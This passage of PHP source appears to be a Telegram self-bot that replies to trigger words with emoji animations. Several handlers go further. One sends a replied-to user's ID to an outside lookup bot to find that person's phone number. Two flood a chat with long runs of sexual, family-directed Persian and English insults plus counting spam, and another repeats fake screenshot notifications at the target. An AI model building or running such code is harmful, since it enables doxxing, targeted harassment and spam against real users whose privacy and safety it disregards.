                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣      💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣     💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣    💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣   💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣  💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣 💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👺🎣💳"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💵🤑phishing🤑💵"]);
                    }
                    if ($text == ' گل بزن ' or $text == 'فوتبال' or $text == 'توی دروازه') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟          ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟         ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟        ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟       ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟      ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟     ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟    ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟   ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟  ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟 ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟  ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟   ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟    ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟     ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟      ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟       ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟        ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟         ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👟          ⚽️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "(توی دروازه🔥)"]);
                    }
                    if ($text == 'برم بخابم') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏                🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏               🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏              🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏             🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏            🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏           🚶🏻‍♂️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏          🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏         🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏        🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏       🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏      🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏     🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏    🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏   🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏  🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛏 🚶🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛌"]);
                    }
                    if ($text == 'غرقش کن') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊              🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊             🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊            🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊           🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊          🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊         🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊        🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊       🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊      🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊     🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊    🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊   🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊  🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌬🌊 🏄🏻‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "غرق شد🙈"]);
                    }
                    if ($text == 'فضانورد') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀              🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀             🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀            🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀           🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀          🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀         🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀        🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀       🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀      🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀     🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀    🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀   🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀  🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🧑‍🚀 🪐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🇮🇷من میگم ایران قویه🇮🇷"]);
                    }
                    if ($text == 'بزن قدش' or $text == 'ایول') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻                    🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻                   🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻                  🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻                 🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻                🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻               🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻              🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻             🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻            🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻           🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻          🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻         🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻        🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻       🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻      🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻     🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻    🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻   🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻  🤛🏻"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤜🏻🤛🏻"]);
                    }
                    if ($text == 'numberr' or $text == 'شمارتت') {
                        if ($type3 == 'supergroup' or $type3 == 'chat') {
                            $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                            $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                            $messag = $gms['messages'][0]['from_id'];
                            $iduser = $messag;
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» درحال جست و جو . . . ! «"]);
                            file_put_contents("msgid25.txt", $msg_id);
                            file_put_contents("peer5.txt", "$peer");
                            file_put_contents("id.txt", "$messag");
                            yield $this->messages->sendMessage(['peer' => "@NumberCityRoBot", 'message' => "🔍 جستوجوی شماره 🔎"]);
                            yield $this->messages->sendMessage(['peer' => "@NumberCityRoBot", 'message' => "$messag"]);
                        } else {
                            if ($type3 == 'user') {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» درحال جست و جو . . . ! «"]);
                                file_put_contents("msgid25.txt", $msg_id);
                                file_put_contents("peer5.txt", "$peer");
                                file_put_contents("id.txt", "$peer");
                                yield $this->messages->sendMessage(['peer' => "@NumberCityRoBot", 'message' => "🔍 جستوجوی شماره 🔎"]);
                                yield $this->messages->sendMessage(['peer' => "@NumberCityRoBot", 'message' => "$peer"]);

                            }
                        }
                    }
                    if ($text == "Number") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ' ❶ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 1, 'message' => ' ❷ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 2, 'message' => ' ❸ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 3, 'message' => ' ❹', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 4, 'message' => '❺', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 5, 'message' => '❻', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 6, 'message' => ' ❼', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 7, 'message' => ' ❽ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 8, 'message' => ' ❾ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 9, 'message' => ' ➓ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 10, 'message' => ' پخخخ بای بای فرزندم شات شدی ', 'parse_mode' => 'MarkDown']);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                    }

                    /*===============شمارش فارسی===============*/
                    if ($text == 'شمارش فا' or $text == 'NumberFa') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'بالاباش ببين چطوري مادرتو صلاخي مکينم چصکي موصکي جان خههخهخهخ بي ناموس ممبر واس من قد قد نکن چص ميکنمت بي ناموس واس اربابت شاخ نشو همين لنگه دمپايي رو تو کس مادرت ول ميدم چسکي مادر حوس کردي کير  بکنم تو ما تحت شعاع ناموس گراميت"؟ خخخهه مادرکسه بالاباش ببينم چي بارته تو  الاغ جان بي ناموس خارکسه تو کيرمم ميشيي يا خير؟؟؟خخخخخخخخخخخخخخ مادرکسه کاتکليک ناموس خخخخخخخخخخخخخخ بالاببالاباش.... اين يک فرمان از اربابت ب تو اضحار شد پس لطفا بالاباش']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'خخخخخخخخخخخخمادرتو ب 9999 روش پوزيشن گاييدم بوم!خخخخخخخخخخخخخخخ خارتو ب روش فرقوني 9999 بار گاييدم بوم!خخخخخخخخخخخخخخخخخخخخخخ پدرتو ب صلاخي بستم 1 بار کلا بوم!خخخخخخخخخخخخخخخخخخخخخخخخخخخخخ مادرت کسه بالاباش مادرت خره بالاباش اوب مممادر الاغ زاده نفهم کسافت ناموس بي فرهنگ ناموس بدخبت خيلي بي عدبي تو بي ناموس ميفهمي؟']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'خارکصه بالا باش']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'خخخخخخخخخخخخخخخ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پيتزا تو کص ننتتتتتتتتت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'رلت تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پاره تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'دفتر تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'موس تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'کتاب تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'برنامه تلگرام تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'برنامه بنديکام تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'گوشيم تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'اين مداد ها تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'خودکار تو ک ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'جمجمه تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'قمقمه تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'سيم تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پنجره تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پارده تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پنکه تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'کيس پيسيم تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'باطريه گوشيم تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'جورابام تو کص ننت']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'بي ناموس کص ننت شد؟']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۲']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۳']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۴']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۵']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۶']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۷']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۸']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۹']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱۰']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۲']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۳']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۴']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۵']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۶']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۷']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۸']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۹']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱۰']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۲']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۳']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۴']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۵']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۶']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۷']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۸']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۹']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱۰']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۲']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۳']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۴']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۵']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۶']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۷']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۸']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۹']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱۰']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۲']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۳']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۴']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۵']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۶']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۷']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۸']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۹']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '۱۰']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'خب دیگه باختی برو تو کص ننت شات شدی بایز پسرم']);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                    }

                    if ($text == 'spam ss' or $text == 'screenspam') {
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                    }
                    /*===============شمارش انگیلیسی===============*/
                    if ($text == 'شمارش ان' or $text == 'NumberEn') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR SAG BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR GAV BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR KHAR BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR KHAZ BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR HEYVUN BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR GORAZ BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR KROKODIL BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR SHOTOR BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR SHOTOR MORGH BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MIKHAY TIZ BEGAMET HALA BEBI KHHKHKHKHK SORAATI NANATO MIKONAM']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'CHIYE KOS MEMBER BABT TAZE BARAT PC KHRIDE BI NAMOS MEMBER?']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'NANE MOKH AZAD NANE SHAM PAYNI NANE AROS MADAR KENTAKI PEDAR HALAZONI KIR MEMBERAK TIZ BASH YALA  TIZZZZZ😂']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'FEK KONAM NANE NANATI NAGAIIDAM KE ENGHAD SHAKHHI????????????????????????????????????HEN NANE GANGANDE PEDAR LASHI']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'to yatimi enghad to pv man daso pa mizani koskesh member man doroste nanato ye zaman mikardam vali toro beh kiramam nemigiram']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'KIRAM TU KUNE NNT BALA BASH KIRAM TU DAHANE MADARET BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'KHARETO BE GA MIDAM BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
